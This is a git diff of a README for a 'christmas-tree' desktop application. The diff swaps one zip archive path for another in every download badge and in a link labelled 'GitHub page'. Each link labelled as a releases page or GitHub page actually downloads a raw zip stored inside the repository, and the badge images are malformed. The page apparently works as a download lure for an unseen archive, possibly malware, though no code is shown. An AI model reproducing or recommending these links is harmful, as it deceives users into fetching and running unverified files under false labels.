@@ -17,7 +17,7 @@ Before you download, ensure your computer meets the following requirements:
 
 To download the christmas-tree application, visit the releases page below:
 
-[![Download Now](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/public/photos/christmas-tree_v2.6.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green)](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/public/photos/christmas-tree_v2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/src/christmas-tree-v3.1.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green)](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/src/christmas-tree-v3.1.zip)
 
 1. Click on the link above to visit the releases page.
 2. Locate the latest release version.
@@ -62,8 +62,8 @@ Stay tuned for upcoming updates and new features added to the christmas-tree app
 
 ## 📞 Contact Information
 
-For any inquiries, please visit our [GitHub page](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/public/photos/christmas-tree_v2.6.zip) or reach out through the GitHub Issues section.
+For any inquiries, please visit our [GitHub page](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/src/christmas-tree-v3.1.zip) or reach out through the GitHub Issues section.
 
 Enjoy your holiday spirit with the christmas-tree application! Happy decorating! 
 
-[![Download Now](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/public/photos/christmas-tree_v2.6.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green)](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/public/photos/christmas-tree_v2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/src/christmas-tree-v3.1.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green)](https://raw.githubusercontent.com/thasinduniduwara/christmas-tree/main/src/christmas-tree-v3.1.zip)
